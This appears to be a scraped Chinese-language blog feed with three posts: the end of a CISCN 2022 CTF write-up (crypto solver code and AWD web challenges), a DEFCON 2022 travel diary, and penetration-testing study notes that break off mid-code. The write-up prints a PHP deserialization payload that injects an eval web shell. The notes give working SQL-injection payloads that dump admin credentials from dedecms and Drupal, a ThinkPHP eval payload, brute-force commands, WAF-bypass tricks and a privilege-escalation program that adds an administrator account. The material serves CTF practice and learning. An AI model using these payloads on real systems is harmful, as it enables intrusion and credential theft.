class="number">168471312867111360682072380440949499624</span>,<span class="number">83002489231793947696180306610753347913</span>,<span class="number">181850915483480478365724927212070209022</span>,<span class="number">31988378704099854892369800287869533334</span>,<span class="number">164069190306115241515513330672566738572</span>,<span class="number">20968485724549308806624305705098823296</span>]),(<span class="number">76205233544349126480906642720404032012</span>,[<span class="number">305030447654966106812630819156617224327</span>,<span class="number">257813469706458852963999235126479482896</span>,<span class="number">19646572578527020171226397193701594536</span>,<span class="number">3096227741298015254290242781056337079</span>,<span class="number">193144454612049425264096843609040583875</span>,<span class="number">131663867163342491996417738843070115893</span>,<span class="number">225042609653050824400550143744526504013</span>],[<span class="number">208200244179108274626478654760656272041</span>,<span class="number">277206679130540511812071164296954433046</span>,<span class="number">133008232900469968393807801737445456047</span>,<span class="number">238187942999310821463031176837431989322</span>,<span class="number">335849605574781654583052890135691606436</span>,<span class="number">43803219416914764604640200649104568720</span>,<span class="number">276238575687619035021067058885214417017</span>]),(<span class="number">204686711424689899259236245265099671151</span>,[<span class="number">55330193663121150614151839948543176192</span>,<span class="number">25374040475906722895551110102466752751</span>,<span class="number">332336287589555261940407367033926210828</span>,<span class="number">236841791562130849608160123633242883485</span>,<span class="number">55132078392822701591355541344100417356</span>,<span class="number">210710935440224596506310010347651890748</span>,<span class="number">246494841359851005113390287205601666834</span>],[<span class="number">339473507188035864234953276558636239614</span>,<span class="number">89814961534867822212610057802248875196</span>,<span class="number">159676081157870578324052534325163446042</span>,<span class="number">278059126074846033027152940362124597383</span>,<span class="number">34703917213859578532087467475347648823</span>,<span class="number">165380347281896132594808120070625786348</span>,<span class="number">139330263516220676740626115157795922525</span>]),(<span class="number">209876243505419239230507609298903863123</span>,[<span class="number">231630314654660388240597169920746438098</span>,<span class="number">319108745154870162781675696472178978700</span>,<span class="number">136580385441834975057798631246982481820</span>,<span class="number">183577018802271270939653308168737951908</span>,<span class="number">323824187627341537434200499585439611550</span>,<span class="number">311284989895183246538067216295958716481</span>,<span class="number">5852988257601121115352692251212404181</span>],[<span class="number">262250385316363078475977443655961217681</span>,<span class="number">44659897377225764927692903931629165495</span>,<span class="number">110331796885242604675024331721197688011</span>,<span class="number">156069809351174897850410833685907713393</span>,<span class="number">71518006372186014009593799874320845431</span>,<span class="number">215822592720683375077289686677881608555</span>,<span class="number">217455673260072965643775624241188442131</span>])]</span><br><span class="line">xlist = [<span class="number">141586027935236199910852696821624556539</span>, <span class="number">40666427516342492776926786656956980320</span>, <span class="number">211934535135753616032329255822871485104</span>, <span class="number">72848036554241506309424877106561776890</span>, <span class="number">294883308555980411146995456458745170680</span>, <span class="number">80828132368001405431441629923575932026</span>, <span class="number">305927509378389767202094045755269682626</span>]</span><br><span class="line"></span><br><span class="line">p=<span class="number">340282366920938463463374607431768211507</span></span><br><span class="line">t=<span class="number">2</span></span><br><span class="line">n=<span class="number">7</span></span><br><span class="line">F=GF(p)</span><br><span class="line"></span><br><span class="line">key = []</span><br><span class="line">tlist = []</span><br><span class="line">ylist = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    ylist.append(sigma[i][<span class="number">0</span>])</span><br><span class="line">    tlist.append(sigma[i][<span class="number">1</span>])</span><br><span class="line">    key.append(sigma[i][<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">B = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n):</span><br><span class="line">    qwq = []</span><br><span class="line">    temp = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n):</span><br><span class="line">        qwq.append(temp)</span><br><span class="line">        temp = temp * xlist[i] % p</span><br><span class="line">    B.append(qwq)</span><br><span class="line">B = Matrix(F, B)</span><br><span class="line">B = B.inverse()</span><br><span class="line">A = Matrix(F, ylist[<span class="number">2</span>:])</span><br><span class="line">A = A.transpose()</span><br><span class="line">C = B*A</span><br><span class="line"><span class="built_in">print</span>(C)</span><br></pre></td></tr></table></figure><h2 id="决赛"><a href="#决赛" class="headerlink" title="决赛"></a>决赛</h2><p>破烂疫情，又是延期又是线上，没去成南开，也没法抄流量，我那时候天天喊的最多的话，大概是寄了</p><p>不过👴是国一！好！</p><p>先丢个榜</p><p><img src="https://img1.imgtp.com/2022/08/28/9RDGd4Cv.png" alt="image-20220828133631102"></p><p>我宣布，决赛就是帆哥哥爆杀之日！（白泽哥太猛了，根本打不过</p><p>线上比个赛，又是双机位又是录屏的</p><h3 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h3><h4 id="web-unserialize-game"><a href="#web-unserialize-game" class="headerlink" title="web_unserialize_game"></a>web_unserialize_game</h4><p>一眼反序列化，先反手把反序列化入口扬了，fix万事</p><p>然后break的payload如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">setAB</span>(<span class="string">&quot;create_function&quot;</span>,<span class="string">&quot;&#125;EVAL(\$_POST[&#x27;a&#x27;]);//&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h4 id="web-just"><a href="#web-just" class="headerlink" title="web_just"></a>web_just</h4><p><a href="http://www.zip泄漏源码,修了半天都修不过去,最后还得是szz哥哥,把白名单全🐑了,然后fix成功了,好好好好好好/">www.zip泄漏源码，修了半天都修不过去，最后还得是szz哥哥，把白名单全🐑了，然后fix成功了，好好好好好好</a></p><h4 id="web-so-easy-4-u"><a href="#web-so-easy-4-u" class="headerlink" title="web_so_easy_4_u"></a>web_so_easy_4_u</h4><p>先发现了几个api</p><p>api&#x2F;save.php存数据</p><p>api&#x2F;get.php读数据</p><p>刚开始一直在看hash怎么算，后来想到可以直接把hash赋值了，越界读..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</p><p>然后修的话，break之后能任意文件读，把save.php读出来把.和&#x2F;过滤掉即可</p><h4 id="web-backdoor"><a href="#web-backdoor" class="headerlink" title="web_backdoor"></a>web_backdoor</h4><p>这题是真的骚，虽然开源了我还没来得及复现，但是比赛的时候我一直修不好，让我以为这题的check写的非常认真的时候，szz哥哥跟我说修好了，把__sleep里原来的return注释掉，换成return “aa”;，我：？好好好好好好</p><h3 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h3><h4 id="web-HouTai"><a href="#web-HouTai" class="headerlink" title="web_HouTai"></a>web_HouTai</h4><p>进行一个对黑名单的补</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// const blacklists = [`&quot;`, `\\`, `|`, `&amp;`, `+`, `-`, `*`, `/`, `^`];</span><br><span class="line">const blacklists = [`&quot;`, `\\`, `|`, `&amp;`, `+`, `-`, `*`, `/`, `^`, `#`];</span><br><span class="line">// const blackwords = [`select`, `drop`, `insert`, `update`, `delete`, `like`, `order`, `truncate`, `create`, `reg`, `sub`, `left`, `right`, `mid`, `if`, `log`, `pro`, `func`, `history`, `file`, `plugin`, `role`, `collation`, `event`];</span><br><span class="line">const blackwords = [`select`, `drop`, `insert`, `update`, `delete`, `like`, `order`, `truncate`, `create`, `reg`, `sub`, `left`, `right`, `mid`, `if`, `log`, `pro`, `func`, `history`, `file`, `plugin`, `role`, `collation`, `event`, `union`, `database`, `flag`];</span><br></pre></td></tr></table></figure><h4 id="web-flasf"><a href="#web-flasf" class="headerlink" title="web_flasf"></a>web_flasf</h4><p>接着补黑名单，然后urlopen和read有ssrf，换成request访问然后就突然好了</p><h4 id="web-即将上线的项目"><a href="#web-即将上线的项目" class="headerlink" title="web_即将上线的项目"></a>web_即将上线的项目</h4><p>前台是个命令执行，直接读flag就行了name&#x3D;system&amp;content&#x3D;cat &#x2F;flaaaaaaggggggggggg&amp;B1&#x3D;提交</p><p>这题是真的恶心，丢个rce给你，不让你杀system函数，check拿着system在根目录乱跑，exp的payload又多的要命，修，修个🔨</p><p>这题多给了10次fix机会，不过每次都是<code>patch失败 check不通过</code>或者<code>patch失败 check通过 exp通过</code>幸运二选一罢了</p><h3 id="赛后"><a href="#赛后" class="headerlink" title="赛后"></a>赛后</h3><p>比赛打完了，这会写博客已经忘的差不多了，我只记得有个最nt的机制是这个</p><p><img src="https://img1.imgtp.com/2022/08/30/Bnsbs8kA.png" alt="截屏2022-08-24 12.28.18"></p><p>我还记得我<code>replace</code>打成了<code>repalce</code>，等我发现之后硬是最后五分钟不让我交了😅</p><p>头一次拿国一，腾讯会议里的颁奖典礼也没多少意思，抽奖的时候抽了个二等奖，不过我的蓝牙耳机已经堆成山了，所以成功和Dbt👴exchange了一下，好！</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>第二年国赛了啊，总算是把国一拿到了，但是还是没有公费旅游，没有茶歇，没有线下真人awd，倒是有大中午的Asuri集体直播干饭</p><p>本来想回学校再看看👴这逆天学校还有什么破烂要求，结果👴开学前夕摇身一变中风险，完事解封了这逆天学校还是不让返校，看着身边的好兄弟们都上学去了，我只能憋在家里等着学校安排，没学上，没班上，在学校还得看人脸色，👴多少也有些可悲了罢</p><p>tnnd，既然学校不让去，那👴就直接去字节上班去喽</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;First-price-at-CISCN2022&quot;&gt;&lt;a href=&quot;#First-price-at-CISCN2022&quot; class=&quot;headerlink&quot; title=&quot;First price at CISCN2022!&quot;&gt;&lt;/a&gt;First price a</summary>
      
    
    
    
    <category term="Life" scheme="http://example.com/categories/Life/"/>
    
    
    <category term="Life" scheme="http://example.com/tags/Life/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>DEFCON2022 at straw hat</title>
    <link href="http://example.com/2022/08/14/DEFCON2022/"/>
    <id>http://example.com/2022/08/14/DEFCON2022/</id>
    <published>2022-08-14T10:51:23.000Z</published>
    <updated>2022-09-01T06:11:05.969Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DEFCON2022-at-straw-hat"><a href="#DEFCON2022-at-straw-hat" class="headerlink" title="DEFCON2022 at straw hat"></a>DEFCON2022 at straw hat</h1><p>很有幸，今年在京东的赞助下，能和Nu1L的师傅们一起线下来打DEFCON，又是十天的大别野时光🤩</p><h2 id="Date-8-11"><a href="#Date-8-11" class="headerlink" title="Date 8.11"></a>Date 8.11</h2><p>晚上九点半左右到的，宾馆大概长这样</p><p><img src="https://s2.loli.net/2022/08/15/473NcUkPX8125Rg.jpg" alt="61660475973_.pic"><br><img src="https://s2.loli.net/2022/08/15/SNwIBn5VWlmD9qX.jpg" alt="71660475974_.pic"></p><p>第一天成功面基了Y老师和他的女朋友，<del>Y老师和女朋友真是太甜了</del>，高铁上饿了一路，就让Y老师带我出去恰夜宵，114说吃饱了，然后就变成我们仨一起了</p><p>来老北京的第一顿烧烤啊，反正我不花钱，吃就完了</p><p>还送了罐奇奇怪怪的呼伦贝尔空气，<del>建议零售价一百，我不好说</del>，但是对面坐着俩不吃饭从头到尾腻歪的小情侣，我只想抱着奇怪味道的空气低头赶紧吃完快逃（</p><p>反正服务员帮忙烤肉，我专心干饭，Y老师专心培养感情，中间服务员突然开始跟我说：“我刚刚不小心碰到了这个红糖年糕，已经给您换了一份”，反正哥们也没看见，让哥们赶紧吃完饭回宾馆，不过有一说一，那晚上年糕吃的没给我活生生腻死（</p><p>晚上终于等到了迟迟没到的酸菜鱼师傅，开过门之后可算是睡下了</p><h2 id="Date-8-12"><a href="#Date-8-12" class="headerlink" title="Date 8.12"></a>Date 8.12</h2><p>一觉睡醒便是8点，好！晚睡早起！还得是我！早上有个小比赛，草草了之了之后便又躺下了，中午和Nu1L提前来的师傅们一起吃了顿好的，便打车去别墅了，我只能说，我贫瘠的语言已经无法形容这么大的豪宅有多爽了，该配环境的配环境，该补觉的补觉，一切的一切的要等到龙哥带着40米长的网线和五六个排插晚上十一点多来，才算是差不多准备好了</p><p><del>不过大伙一致统一的把龙哥一个人要的旺仔喝完了</del></p><p>只见龙哥要旺仔，不见龙哥喝旺仔（</p><p><img src="https://img1.imgtp.com/2022/08/27/MMDjy7gs.jpg" alt="301660912669_.pic"></p><p>然后就是三天的通宵熬夜打比赛，不过今年体验不是很好，就不展开详细说了，就丢几个照片好了</p><p>在美国搞的超级帅的队旗</p><p><img src="https://img1.imgtp.com/2022/08/27/lRMWG6sS.png" alt="image-20220827173033842"></p><p>北京现场整了个大屏</p><p><img src="https://img1.imgtp.com/2022/08/27/vDf33wdD.png" alt="image-20220827172722972"></p><p>后来拿来看livectf了，反正是真男人1v1打pwn，一大桌子人看着然后指指点点，倒是蛮好玩的</p><p><img src="https://img1.imgtp.com/2022/08/27/1HfPFPRg.jpg" alt="image-20220827171941476"></p><p>干翻科恩!.jpg</p><p><img src="https://img1.imgtp.com/2022/08/27/416uRe2o.png" alt="image-20220827172616193"></p><p>r3livectf上给赛宁打的广告（<del>这logo居然还会跳</del></p><p><img src="https://img1.imgtp.com/2022/08/27/nl3hlGjS.png" alt="image-20220827173254691"></p><p><img src="https://img1.imgtp.com/2022/08/27/mtx3QdQn.png" alt="image-20220827172713813"></p><p>大合照～</p><p><img src="https://img1.imgtp.com/2022/08/27/zlsqGjQK.png" alt="image-20220827172919938"></p><p>新mac第一次出征啦</p><p><img src="https://img1.imgtp.com/2022/08/27/8LGeCJs4.png" alt="image-20220827173357500"></p><p>关于三十多号人在荒郊野岭的别墅里每天怎么吃饭（</p><p><img src="https://img1.imgtp.com/2022/08/27/G9b01xpt.png" alt="image-20220827173428736"></p><p>最后遗憾第七</p><p><img src="https://img1.imgtp.com/2022/08/27/0MLaagI1.png" alt="image-20220827173518520"></p><p>比赛的时候没web，Y老师当天手搓了个awd平台，最骚的是每次更新都更智能更好看（<del>这就是软件工程的学生吗.jpg</del></p><p>虽然但是，N1的大哥们真nb</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>总而言之，密码手虽然没有很大的贡献，但是也帮着大家一起做了做KOH题，总之，见到了想见的师傅们，也玩的很开心！</p><p>明年见啦～</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DEFCON2022-at-straw-hat&quot;&gt;&lt;a href=&quot;#DEFCON2022-at-straw-hat&quot; class=&quot;headerlink&quot; title=&quot;DEFCON2022 at straw hat&quot;&gt;&lt;/a&gt;DEFCON2022 at str</summary>
      
    
    
    
    <category term="Life" scheme="http://example.com/categories/Life/"/>
    
    
    <category term="Life" scheme="http://example.com/tags/Life/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透笔记</title>
    <link href="http://example.com/2022/07/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"/>
    <id>http://example.com/2022/07/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</id>
    <published>2022-07-13T02:58:41.000Z</published>
    <updated>2022-07-14T08:30:58.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网渗透笔记"><a href="#内网渗透笔记" class="headerlink" title="内网渗透笔记"></a>内网渗透笔记</h1><p>大一脑子进水报了卓越班，放暑假了还在这坐大牢，做一天和尚撞一天钟，记个笔记让我这个月有点收获吧（</p><hr><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-P 指定扫描端口</span><br><span class="line">-O 操作系统检测</span><br><span class="line">-A 操作系统版本检测</span><br><span class="line">-PE/PP/PM 使用ICMP echo/ICMP timestamp/ICMP netmask请求包发现主机</span><br><span class="line">-PS/PA/PU/PY 使用TCP SYN/TCP ACK/SCTP INIT/ECHO方式进行发现</span><br><span class="line">-sV 服务版本扫描</span><br><span class="line">-sn xxx.xxx.xxx.xxx/24 C段扫描</span><br></pre></td></tr></table></figure><h3 id="git泄露"><a href="#git泄露" class="headerlink" title=".git泄露"></a>.git泄露</h3><blockquote><p>如果存在&#x2F;.git页面则存在git泄露</p></blockquote><p>GitHack</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://192.168.xxx.xxx/.git</span><br></pre></td></tr></table></figure><h3 id="svn泄露"><a href="#svn泄露" class="headerlink" title=".svn泄露"></a>.svn泄露</h3><blockquote><p>如果存在&#x2F;.svn页面则存在svn泄露</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python SvnExploit.py -u http://192.168.xxx.xxx/.svn --dump</span><br></pre></td></tr></table></figure><h3 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h3><p>intruder爆破</p><h3 id="域名收集"><a href="#域名收集" class="headerlink" title="域名收集"></a>域名收集</h3><p>subDomainsBrute 子域名枚举</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 subDomainsBrute.py xxxxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure><p>搜索引擎</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site: xxxxxxxxxxxxx</span><br></pre></td></tr></table></figure><p>Sublist3r-master 第三方聚合服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sublist3r.py -d xxxxxx -o xxxxxx.txt</span><br></pre></td></tr></table></figure><p>证书透明信息 <a href="https://crt.sh/">https://crt.sh</a></p><h3 id="获取真实IP"><a href="#获取真实IP" class="headerlink" title="获取真实IP"></a>获取真实IP</h3><blockquote><ol><li><p>ping</p></li><li><p>nslookup</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup xxxxxxx 8.8.8.8</span><br><span class="line">nslookup xxxxxxx 114.114.114.114</span><br></pre></td></tr></table></figure><ol start="3"><li>等</li></ol></blockquote><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="web漏洞扫描"><a href="#web漏洞扫描" class="headerlink" title="web漏洞扫描"></a>web漏洞扫描</h3><p>nikto 扫描器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -host http://xxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure><p>sqlmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://xxxxxx --level 3</span><br></pre></td></tr></table></figure><h3 id="弱口令扫描"><a href="#弱口令扫描" class="headerlink" title="弱口令扫描"></a>弱口令扫描</h3><p>Hydra</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-l 指定单个用户名</span><br><span class="line">-L 指定多个用户名文件</span><br><span class="line">-P 指定多个密码文件</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -U ssh</span><br><span class="line">hydra xxx.xxx.xxx.xxx ssh -l root -P <span class="string">&#x27;xxxxxxxxxx&#x27;</span> -V</span><br></pre></td></tr></table></figure><p>Metasploit</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfconsole 进入metasploit</span><br><span class="line">search ssh_login 搜索相关模块</span><br><span class="line">use xxxxxxxxxxxxxxx 使用某模块</span><br><span class="line">show options 展示配置参数</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rhost xxx.xxx.xxx.xxx</span><br><span class="line"><span class="built_in">set</span> user_file /root/user.txt</span><br><span class="line"><span class="built_in">set</span> pass_file /root/pass.txt</span><br><span class="line"><span class="built_in">set</span> threads 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">intext: 正文关键字</span><br><span class="line">intitle: 标题关键字</span><br><span class="line">allintitle: 多个标题关键字</span><br><span class="line">inurl: url关键字</span><br><span class="line">allinurl: 多个url关键字</span><br><span class="line">site: 指定访问站点</span><br><span class="line">filetype: 文件类型</span><br><span class="line">link: 指定链接</span><br><span class="line">related: 布局相似</span><br><span class="line">cache: 谷歌快照</span><br><span class="line">info: 指定信息</span><br><span class="line">define: 词语定义</span><br><span class="line">phonebook: 电话信息</span><br><span class="line">Index of: 发现允许目录浏览的web网站</span><br></pre></td></tr></table></figure><h3 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h3><p>搜索引擎</p><h3 id="系统漏洞扫描"><a href="#系统漏洞扫描" class="headerlink" title="系统漏洞扫描"></a>系统漏洞扫描</h3><p>Nessus</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/nessusd start</span><br><span class="line">netstat -ntpl | grep nessus</span><br></pre></td></tr></table></figure><p>本地访问即可</p><p>MetaSploitFramework</p><p>同上利用即可</p><h2 id="web渗透测试"><a href="#web渗透测试" class="headerlink" title="web渗透测试"></a>web渗透测试</h2><h3 id="dedecms"><a href="#dedecms" class="headerlink" title="dedecms"></a>dedecms</h3><p>测试payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx.xxx.xxx/plus/search.php?keyword[ uNion ]=a</span><br></pre></td></tr></table></figure><blockquote><p>Request Error step 1 !</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/plus/search.php?keyword=as&amp;typeArr[111%3D@`\&#x27;`)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`\&#x27;`+]=a</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>Request Error step 2 !</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/plus/search.php?keyword=as&amp;typeArr[111%3D@`\&#x27;`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+`%23@__admin`%23@`\&#x27;`+]=a</span><br></pre></td></tr></table></figure></blockquote><h3 id="Drupalcms"><a href="#Drupalcms" class="headerlink" title="Drupalcms"></a>Drupalcms</h3><p>sql注入payload</p><p>爆库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pass=lol&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log+in&amp;name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&amp;name[0]=a</span><br></pre></td></tr></table></figure><p>爆表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lol&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log+in&amp;name[0 or updatexml(0,concat(0xa,(SELECT table_name FROM information_schema.tables WHERE table_schema like database() limit 70,1)),0)%23]=bob&amp;name[0]=a</span><br></pre></td></tr></table></figure><p>爆字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lol&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log+in&amp;name[0 or updatexml(0,concat(0xa,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema like database()and table_name like ‘users’ )),0)%23]=bob&amp;name[0]=a</span><br></pre></td></tr></table></figure><p>爆内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lol&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log+in&amp;name[0 or updatexml(0,concat(0xa,substring((SELECT group_concat(name,’’,pass) FROM users),1,60)),0)%23]=bob&amp;name[0]=alol&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log+in&amp;name[0 or updatexml(0,concat(0xa,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema like database()and table_name like ‘users’ )),0)%23]=bob&amp;name[0]=a</span><br></pre></td></tr></table></figure><h3 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h3><p>略</p><h3 id="ThinkPHP2"><a href="#ThinkPHP2" class="headerlink" title="ThinkPHP2"></a>ThinkPHP2</h3><p>路由解析问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx.xxx.xxx/index.php?s=a/b/c/$&#123;@phpinfo()&#125;</span><br><span class="line">http://xxx.xxx.xxx.xxx/index.php?s=a/b/c/$&#123;@print(eval($_POST[1]))&#125;</span><br></pre></td></tr></table></figure><h2 id="攻防技术"><a href="#攻防技术" class="headerlink" title="攻防技术"></a>攻防技术</h2><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><p>注就完了</p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>略</p><h3 id="绕过防火墙"><a href="#绕过防火墙" class="headerlink" title="绕过防火墙"></a>绕过防火墙</h3><p>http协议覆盖绕过（编码等）</p><p>pipline绕过（一次发俩包）</p><p>分块传输绕过（把post部分分块）</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="环境变量劫持"><a href="#环境变量劫持" class="headerlink" title="环境变量劫持"></a>环境变量劫持</h4><p>在root的SUID下的程序里调用cat，新建一个cat，写进去shell，再把环境变量写在前面去，然后回去运行，即可拿到shell</p><h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br></pre></td></tr></table></figure><h4 id="内核漏洞"><a href="#内核漏洞" class="headerlink" title="内核漏洞"></a>内核漏洞</h4><p>搜就完事</p><h4 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><p>利用find可以执行其他命令等</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h4 id="PATH环境变量配置错误"><a href="#PATH环境变量配置错误" class="headerlink" title="PATH环境变量配置错误"></a>PATH环境变量配置错误</h4><p>exp.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    i=system(<span class="string">&quot;net user as Admin@123. /add&quot;</span>);</span><br><span class="line">    j=system(<span 